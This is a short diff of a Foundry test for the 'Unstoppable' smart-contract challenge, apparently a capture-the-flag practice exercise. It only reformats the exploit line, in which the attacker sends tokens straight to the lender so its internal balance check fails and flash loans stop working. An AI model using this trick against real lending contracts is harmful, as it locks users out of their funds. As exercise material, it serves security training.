@@ -65,7 +65,10 @@ contract Unstoppable is DSTest {
         // update UnstoppableLender.poolBalance and the assertion in the flashLoan
         // method bricks the contract
         vm.prank(attacker);
-        dvt.transfer(address(unstoppableLender), INITIAL_ATTACKER_TOKEN_BALANCE);
+        dvt.transfer(
+            address(unstoppableLender),
+            INITIAL_ATTACKER_TOKEN_BALANCE
+        );
 
         /** EXPLOIT END **/
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
